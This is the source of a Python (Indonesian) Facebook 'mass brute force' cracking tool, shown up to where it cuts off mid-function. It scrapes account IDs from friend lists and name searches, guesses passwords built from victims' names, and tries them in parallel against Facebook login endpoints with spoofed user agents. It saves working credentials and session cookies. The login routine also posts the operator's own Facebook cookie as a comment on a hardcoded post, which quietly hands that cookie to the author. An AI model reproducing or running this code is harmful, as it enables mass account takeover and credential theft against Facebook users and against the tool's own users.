# Hello bro, don't forget to follow and give stars 
# File Name  : run.py ( Bacem MBF )                                    
# Source By   : Aditya Putra Mahesa XD ( Xyaa Code )                  
# Last Update : Sabtu 21 Januari 2023                                  
# This script is free, don't sell it!                                      

###----------[ IMPORT MODULE ]----------###
import re,requests,os,time
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as XyaaCode
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parse
from time import time as TimeAdtya
from datetime import datetime

###----------[ MODULE RICH ]----------###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ GLOBAL NAMA ]----------###
ses = requests.Session()
ID, tampung, methode = [], [], []
uadia, uadarimu = [], []
ok, cp, loop = [], [], 0
sys.stdout.write('\x1b]2; BACEM | (MBF) \x07')

###----------[ WARNA UNTUK PRINT ]----------###   
P = '\x1b[0m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAUU
K = '\x1b[1;93m' # KUNING

###----------[ WARNA UNTUK RICH ]----------###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RC = random.choice([M2, H2, K2, J2, N2, A2, U2, B2, O2])

###----------[ CONVERT BULAN ]----------###
day = datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"result/OK-{days}-{reall}-{year}.txt"
cpc = f"result/CP-{days}-{reall}-{year}.txt"

class login:

    def __init__(self):
        self.ses = requests.Session()
        self.ads = "https://web.facebook.com/adsmanager"
        self.web = "https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer"
        self.MyUserAgent = "Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        self.loginEfbi()
            
    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
           
    def Time(self):
         now = datetime.now()
         hours = now.hour
         if 4 <= hours < 12:timenow = "Selamat Pagi"
         elif 12 <= hours < 15:timenow = "Selamat Siang"
         elif 15 <= hours < 18:timenow = "Selamat Sore"
         else:timenow = "Selamat Malam"
         return timenow

    def logoku(self):
        try:
           os.popen('play-audio data/sound/logo.mp3')
        except:
           pass
        prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time()}",subtitle=f"{P2}version {RC}2.0.2",padding=(0,7),style=f"#AAAAAA"))

    def loginEfbi(self):
        self.clear();self.logoku()
        prints(Panel(f"{P2}silahkan login menggunakan cookie facebook, wajib menggunakan akun tumbal",padding=(0,2),style=f"#AAAAAA"))
        coki = console.input(f" {P2}({H2}•{P2}) masukan cookie facebook : ")
        with requests.Session() as ses:
           try:
               link = ses.get(f"{self.ads}",cookies={'cookie':coki}).text
               find = re.findall('act=(.*?)&nav_source',link)
               if len(find) == 0:
                 prints(f' {P2}({H2}•{P2}) cookie yang anda masukan invalid')
                 time.sleep(3);exit()
               else:
                     for xc in find:
                         url = ses.get(f'{self.web}'.format(xc), cookies={'cookie':coki})
                         tok = re.search('(EAAB\w+)',url.text).group(1)
                         if 'EAAB' in tok:
                            ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={coki}&access_token={tok}",cookies={"cookie":coki}) # Jangan di ganti 
                            ses.post(f"https://graph.facebook.com/549345863862686/likes?summary=true&access_token={tok}",cookies={"cookie":coki}) # udh dibilang Jangan di ganti 
                            open('data/tokenku.txt','w').write(tok)
                            open('data/cokis.txt','w').write(coki)
                            prints(f' {P2}({H2}•{P2}) login cookie berhasil'),
                            time.sleep(3);MulaiTools()
           except AttributeError:
              prints(f' {P2}({H2}•{P2}) cookie yang anda masukan invalid')
              time.sleep(3);exit()

class MulaiTools:

    def __init__(self):
        self.emoji = random.choice(["clock","smiley","earth","moon"])
        self.query   = ses.get("http://ip-api.com/json/").json()["query"]
        self.country = ses.get("http://ip-api.com/json/").json()["country"]
        self.regionName = ses.get("http://ip-api.com/json/").json()["regionName"]
        self.city = ses.get("http://ip-api.com/json/").json()["city"]
        self.dump()
        
    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
    
    def Time(self):
         now = datetime.now()
         hours = now.hour
         if 4 <= hours < 12:timenow = "Selamat Pagi"
         elif 12 <= hours < 15:timenow = "Selamat Siang"
         elif 15 <= hours < 18:timenow = "Selamat Sore"
         else:timenow = "Selamat Malam"
         return timenow
    
    def logoos(self):
        self.clear()
        try:
           os.popen('play-audio data/sound/logo.mp3')
        except:
           pass
        prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time()}",subtitle=f"{P2}version {RC}2.0.2",padding=(0,7),style=f"#AAAAAA"))

    def logMasuk(self):
        self.logoos()
        prints(Panel(f"{P2}info, segala bentuk kerugian dan penyalahgunaan akun korban bukan tangung jawab author jika anda setuju maka tangung jawab sepenuh nya di tangan anda ketik {H2}'Y'{P2} untuk setuju dan ketik '{M2}T{P2}' untuk tidak setuju",title=f"{H2}Informasi",width=80,padding=(0,2),style=f"#AAAAAA"))
        war = input(f" {H}•{P} ingin lanjut ke tools? (Y/t) :{H} ")
        if war in ["y","Y","Ya","YA"]:
          open('data/warning.txt','w').write(f'{war}')
          time.sleep(2);MulaiTools()
        elif war in ["t","T","tidak","Tidak","TIDAK"]:
          print(f" {H}•{P} selamat tinggal...")
          time.sleep(3);exit()
        else:
          print(f" {H}•{P} pilih Y atau T")
          time.sleep(2);MulaiTools()

    def dump(self):
         try:open('data/warning.txt','r').read()
         except:self.logMasuk()
         try:
             cok = {"cookie":open('data/cokis.txt','r').read()}
             tok = open('data/tokenku.txt','r').read()
         except:
             login()
         try:
             self.urls = requests.get("https://graph.facebook.com/v15.0/me?access_token=%s"%(tok),cookies=cok).json()
             self.nama = self.urls["name"]
             self.id     = self.urls["id"]
         except KeyError:
             login()
         except Exception as e:
             prints(f' {P2}({H2}•{P2}) opshhh, terjadi kesalahan')
             time.sleep(3);exit()
         self.logoos()
         self.padding = []
         self.padding.append(Panel(f'{P2}nama    : {H2}{self.nama}\n{P2}id akun : {H2}{self.id}',width=40,padding=(0,2),style=f"#AAAAAA"))
         self.padding.append(Panel(f'{P2}ip kamu : {H2}{self.query}\n{P2}negara  : {H2}{self.country}',width=38,padding=(0,2),style=f"#AAAAAA"))
         console.print(Columns(self.padding))
         prints(Panel(f"{P2}[{H2}01{P2}]. dump id publik massal     {P2}[{H2}05{P2}]. check hasil crack\n{P2}[{H2}02{P2}]. dump id pencarian nama    {P2}[{H2}06{P2}]. check opsi chekpoint\n{P2}[{H2}03{P2}]. dump id total pengikut    {P2}[{H2}07{P2}]. report bug script\n{P2}[{H2}04{P2}]. dump id email random      {P2}[{H2}00{P2}]. keluar ( hapus cookie )",padding=(0,7),style=f"#AAAAAA"))
         askk = console.input(f" {P2}({H2}•{P2}) masukan pilihan : ")
         if askk in ['1','01']:
              prints(Panel(f"{P2}anda bisa menggunakan tanda (,) koma jika ingin lebih dari 1 id",subtitle=f"{P2}ketik {H2}'me'{P2} untuk dump daftar teman sendiri",padding=(0,6),style=f"#AAAAAA"))
              uid = console.input(f' {P2}({H2}•{P2}) masukan id akun : ')
              for c in uid.split(','):
                  try:
                      url = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5000)&access_token={}".format(c,tok),cookies=cok).json()
                      for x in url["friends"]["data"]:
                          ID.append(x["id"]+'<=>'+x["name"])
                          war = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
                          sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id')
                          sys.stdout.flush()
                          time.sleep(0000.00003)
                      print("\r")
                  except KeyError:
                      prints(f" {P2}({H2}•{P2}) akun dengan id {M2}{c}{P2} tidak publik")
              self.settingUserAgents()

         elif askk in ['3','03']:
             prints(Panel(f"{P2}mohon maaf dump id dari pengikut belum tersedia, next update ya :)",padding=(0,5),style=f"#AAAAAA"))
             time.sleep(3);exit()
         
         elif askk in ['4','04']:
             prints(Panel(f"""{P2}masukan nama email yang ingin anda dump cnth : aditya, ngentot, mark""",padding=(0,4),style=f"#AAAAAA"))
             nama = console.input(f" {P2}({H2}•{P2}) masukan nama email : ")
             prints(Panel(f"""{P2}masukan domain cnth : @gmail.com, @yahoo.com, @co.id  & jumlah email""",padding=(0,4),style=f"#AAAAAA"))
             domain = console.input(f" {P2}({H2}•{P2}) masukan domain : ")
             jumlah = console.input(f" {P2}({H2}•{P2}) masukan jumlah : ")
             self.dump_email(nama, domain, jumlah)
             self.settingUserAgents()
                      
         elif askk in ['5','05']:
             self.viewResults()
         
         elif askk in ['6','06']:
             prints(Panel(f"{P2}mohon maaf check opsi chekpoint belum tersedia, next update ya :)",padding=(0,5),style=f"#AAAAAA"))
             time.sleep(3);exit()
         
         elif askk in ['7','07']:
             self.wa = "https://wa.me/+16143244921"
             self.a = "assalamualaikum"
             self.b = "bang"
             prints(f" {P2}({H2}•{P2}) anda akan di arahkan ke WhatsApp...")
             try:
                 os.system("xdg-open {}?text={}+{}".format(self.wa, self.a, self.b))
                 time.sleep(3);exit()
             except requests.exceptions.ConnectionError:
                 prints(f" {P2}({H2}•{P2}) koneksi internet anda bermasalah")
                 time.sleep(3);exit()
                     
         elif askk in ['0','00']:
             prints(Panel(f"{RC}{open('data/cokis.txt','r').read()}\n\n{open('data/tokenku.txt','r').read()}",style=f"#AAAAAA"))
             cok = console.input(f" {P2}({H2}•{P2}) apakah anda ingin menghapus cookie? (Y/t) : ")
             if cok in ["y","Y"]:
               try:os.system('rm -rf data/cokis.txt')
               except:pass
               prints(f" {P2}({H2}•{P2}) berhasil menghapus cookie anda")
               time.sleep(3);exit()
             elif cok in ["t","T"]:
                 prints(f" {P2}({H2}•{P2}) jalankan ulang scriptnya")
                 time.sleep(3);exit()
             else:
               prints(f" {P2}({H2}•{P2}) pilih yang bener")
               time.sleep(3);exit()
                       
         elif askk in ['2','02']:
              prints(Panel(f"{P2}masukan nama target, gunakan tanda (,) koma jika ingin lebih dari 1 nama",padding=(0,2),style=f"#AAAAAA"))
              username = []
              Custom = [" xyz"," xd"," muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya"," kirana"]
              custoM = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak ","kirana "]
              nama = console.input(f" {P2}({H2}•{P2}) masukan nama : ").split(",")
              for asu in nama:
                  for endd in Custom:
                      dump = asu+endd
                      username.append(dump)
                  for pornhub in custoM:
                      dump = pornhub+asu
                      username.append(dump)
              with XyaaCode(max_workers=30) as adtya:
                  for bacem in username:
                       adtya.submit(self.dump_nama,"https://mbasic.facebook.com/public/{}?/locale2=id_ID".format(bacem))
              print("\r")
              self.settingUserAgents()
         else:
              prints(f" {P2}({H2}•{P2}) ngetik apaan ngab!")
              time.sleep(3);exit()

    def viewResults(self):
        urut = []
        urut.append(Panel(f'{P2}check akun hasil ok',width=40,padding=(0,7),title=f"{H2}01",style=f"#AAAAAA"))
        urut.append(Panel(f'{P2}check akun hasil cp',width=38,padding=(0,8),title=f"{H2}02",style=f"#AAAAAA"))
        console.print(Columns(urut))
        xcTeam = console.input(f" {P2}({H2}•{P2}) pilih hasil : ")
        if xcTeam in ["1","01"]:
           try:
               os.system("ul results/OK.txt")
           except:
               prints(f" {P2}({H2}•{P2}) anda tidak memiliki file hasil ok")
               time.sleep(3);exit()

        elif xcTeam in ["2","02"]:
           try:
               os.system("ul results/CP.txt")
           except:
               prints(f" {P2}({H2}•{P2}) anda tidak memiliki file hasil cp")
               time.sleep(3);exit()
        else:
           MulaiTools()
    
    def dump_email(self, nama, domain, jumlah):
         try:
             for b in range(int(jumlah)):
                 if len(nama.split()) > 1:
                    email = str(nama.split()[0])+str(nama.split()[1])+str(b)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
                 else:
                    email = str(nama)+str(b)+str(domain)+"<=>"+str(nama)
                 if email in ID:pass
                 else:ID.append(email)
                 sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {H}{len(ID)} {P}id');sys.stdout.flush()
             print("\r")
         except Exception as e:
             pass

    def dump_nama(self,url_nama):
         war = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
         try:
              link = parse(requests.get(str(url_nama)).text,'html.parser')
              for find_id in link.find_all('td'):
                  data_find = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(find_id))
                  for id,user in data_find:
                      if 'profile.php?' in id:
                          id = re.findall('id=(.*)',str(id))[0]
                      elif '<span' in user:
                          user = re.findall('(.*?)\<',str(user))[0]
                      data_ditemukan = '%s<=>%s'%(id,user)
                      if data_ditemukan in ID:pass
                      else:
                           sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id...')
                           sys.stdout.flush()
                           time.sleep(0000.00003)
                           ID.append(data_ditemukan)
                  for next_url_name in link.find_all('a',href=True):
                      if 'Lihat Hasil Selanjutnya' in next_url_name.get('href'):
                          print(next_url_name)
                          self.dump_nama(next_url_name['href'])
         except Exception as e:
              pass
    
    def settingUserAgents(self):
        prints(Panel(f'{P2}ketik {H2}"T"{P2} jika ingin menggunakan {H2}ua{P2} yang sudah tersedia di dalam script',padding=(0,3),style=f"#AAAAAA"))
        ua = console.input(f" {P2}({H2}•{P2}) ingin menggunakan useragent manual? (Y/t) : ")
        if ua in ["y","Y"]:
          uadarimu.append('uadia')
          prints(Panel(f"{P2}cek useragent anda di {RC}http://my-user-agent.com/ {P2}copy lalu paste disini",padding=(0,3),style=f"#AAAAAA"))
          xyaaXD = console.input(f" {P2}({H2}•{P2}) masukan useragent : ")
          uadia.append(xyaaXD)
          self.pilMetode()
        else:
             uadarimu.append('userAgentss')
             self.pilMetode()

    def pilMetode(self):
        prints(Panel(f"{P2}[{H2}01{P2}]. methode regular {H2}mbasic.facebook.com\n{P2}[{H2}02{P2}]. methode validate {H2}m.facebook.com\n{P2}[{H2}03{P2}]. methode async {H2}m.facebook.com",title=f"{H2}Methode Login",padding=(0,16),style=f"#AAAAAA"))
        TeamXyaa = console.input(f" {P2}({H2}•{P2}) pilih methode : ")
        if TeamXyaa in ['1','01']:
             methode.append("REGULAR")
             self.GeneratePassword()
        elif TeamXyaa in ['2','02']:
             methode.append("VALIDATE")
             self.GeneratePassword()
        elif TeamXyaa in ["3","03"]:
             methode.append("ASYNC")
             self.GeneratePassword()
        else:
             methode.append("ASYNC")
             self.GeneratePassword()
    
    def tampung(self):
         prints(Panel(f"{P2}[ {H2}hasil crack akan di simpan di dalam folder results {P2}]",width=80,padding=(0,11),style=f"#AAAAAA"))
         prints(Panel(f"{P2}results akun {H2}ok{P2} tersimpan ke : {H2}{okc}\n{P2}results akun {K2}cp{P2} tersimpan ke : {K2}{cpc}",padding=(0,8),style=f"#AAAAAA"))
    
    def GeneratePassword(self):
        global prog, des
        self.clear();self.logoos()
        self.tampung()
        prog = Progress(SpinnerColumn(f'{self.emoji}'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
        des = prog.add_task('',total=len(ID))
        with prog:
             with XyaaCode(max_workers=30) as xc:
                  for UserAkun in ID:
                      try:
                         uid,nama = UserAkun.split('<=>')
                         pwidd = nama.split(' ')[0]
                         if len(nama) <=5:
                                if len(pwidd) <=1 or len(pwidd) <=2:
                                       pwx = [
                                          pwidd+'123',
                                          pwidd+'1234',
                                          pwidd+'12345',
                                          pwidd+'123456'
                                       ]
                                else:
                                       pwx = [
                                          nama,
                                          nama+'123',
                                          pwidd,
                                          pwidd+'123',
                                          pwidd+'1234',
                                          pwidd+'12345',
                                          pwidd+'123456'
                                       ]
                         else:
                                pwx = [
                                   nama,
                                   nama+'123',
                                   pwidd,
                                   pwidd+'123',
                                   pwidd+'1234',
                                   pwidd+'12345',
                                   pwidd+'123456'
                                ]
                         if 'REGULAR' in methode:
                             xc.submit(self.regular, uid, pwx)
                         elif 'VALIDATE' in methode:
                             xc.submit(self.validate, uid, pwx)
                         elif 'ASYNC' in methode:
                             xc.submit(self.metodeASYNC, uid, pwx)
                         else:
                             xc.submit(self.metodeASYNC, uid, pwx)
                      except Exception as e:
                         pass
        prints(Panel(f"\r{P2}crack {RC}{len(ID)}{P2} id telah selesai, hasil Live-:{H2}{len(ok)}{P2} Check-:{K2}{len(cp)}{P2}",padding=(0,11),style=f"#AAAAAA"))
        time.sleep(3);exit()
    
    def generateUserAgent(self):
        self.rr = random.randint
        self.rc = random.choice
        self.andro = self.rc(["9","9.0","8.1.0","7.1.2","6.0.1","10.0.1"])
        self.merk = str(self.rr(4, 11))
        self.build = str(self.rr(111111, 199999))
        self.chrome = str(self.rr(60, 99))+".0."+str(self.rr(3300, 5900))+"."+str(self.rr(120, 150))
        self.edg = str(self.rr(40, 99))+"0.0."+str(self.rr(2000, 2999))
        return (f"Mozilla/5.0 (Linux; Android {self.andro}; Redmi {self.merk} Prime Build/OPM6.{self.build}.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome} Mobile Safari/537.36 EdgA/{self.edg}")
    
    def regular(self, user, pwx):
        global ok, cp, loop
        ua = self.generateUserAgent()
        prog.update(des,description=f"{H2}regular{P2} {loop}/{len(ID)} Live-:{H2}{len(ok)} {P2}Check-:{K2}{len(cp)}")
        prog.advance(des)
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 else: ua
                 ses = requests.Session()
                 link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
                 data = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number":"0",
                    "unrecognized_tries":"0",
                    "email":user,
                    "pass":pw,
                    "login":"Masuk",
                    "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    }
                 head = {
                    "Host": "mbasic.facebook.com",
                    "Connection": "keep-alive",
                    "Content-Length": "181",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://mbasic.facebook.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "X-Requested-With": "mark.via.gp",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                 r = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     tree = Tree("")
                     tree.add(f"{H2}{user}|{pw}")
                     tree.add(f"{H2}{coki} | {ua}")
                     prints(tree)
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     tree = Tree("")
                     tree.add(f"{K2}{user}|{pw}")
                     prints(tree)
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1
    
    def validate(self, user, pwx):
        global ok, cp, loop
        ua = self.generateUserAgent()
        prog.update(des,description=f"{H2}validate{P2} Live-:{H2}{len(ok)} {P2}Check-:{K2}{len(cp)} {P2}{loop}/{len(ID)}")
        prog.advance(des)
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 else: ua
                 ses = requests.Session()
                 link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
                 data = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "uid":user,
                    "next":"https://m.facebook.com/login/save-device/",
                    "flow":"login_no_pin",
                    "encpass": f"#PWD_BROWSER:0:{str(TimeAdtya()).split('.')[0]}:{pw}",
                    }
                 headers = {
                    "Host": "m.facebook.com",
                    "Connection": "keep-alive",
                    "Content-Length": "322",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://m.facebook.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "X-Requested-With": "mark.via.gp",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                 r = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = data, headers = headers, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     tree = Tree("")
                     tree.add(f"{H2}{user}|{pw}")
                     tree.add(f"{H2}{coki} | {ua}")
                     prints(tree)
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     tree = Tree("")
                     tree.add(f"{K2}{user}|{pw}")
                     prints(tree)
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1
    
    def ugentku(self):
        self.rr = random.randint
        self.rc = random.choice
        self.versi_androi = self.rc(["4.1.1","2.3.6","4.0.3","2.3.3","4.0.4","4.1","2.2.1"])
        self.versi_presto = str(self.rr(0,2))+"."+str(self.rr(0,11))+"."+str(self.rr(300,399))
        self.adrr = "ADR-"+str(self.rr(1000000000,9000000000))
        self.versii = "12.10"
        self.builedd = "PPR1."+str(self.rr(111111,199999))+".011"
        self.userr1 = f"Dalvik/2.1.0 (Linux; U; Android {str(self.rr(7,12))}; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/{str(self.rr(200,399))}.0.0.{str(self.rr(0,99))}.{str(self.rr(100,150))};FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/{str(self.rr(200000000,900000000))};FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/{str(self.rr(7,12))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
        self.userr2 = f"Dalvik/2.1.0 (Linux; U; Android {str(self.rr(7,12))}; Nokia 1 Plus Build/{self.builedd})"
        self.userr3 = f"Opera/9.80 (Android {self.versi_androi}; Linux; Opera Mobi/{self.adrr}) Presto/{self.versi_presto} Version/{self.versii}"
        self.usermain = self.rc([self.userr1, self.userr2, self.userr3])
        return self.usermain
    
    def metodeASYNC(self, user, pwx):
        global ok ,cp, loop
        self.warnn = random.choice([H2, K2, J2, B2, O2, N2, A2, U2])
        ua = self.ugentku()
        prog.update(des,description=f"[ {self.warnn}Async{P2} ] {self.warnn}{loop}/{len(ID)}{P2} Live-:{H2}{len(ok)} {P2}Check-:{K2}{len(cp)}")
        prog.advance(des)
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 else: ua
                 ses = requests.Session()
                 link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
                 data = {
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": user,
                    "prefill_contact_point": f"{user} {pw}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(TimeAdtya()).split('.')[0]}:{pw}",
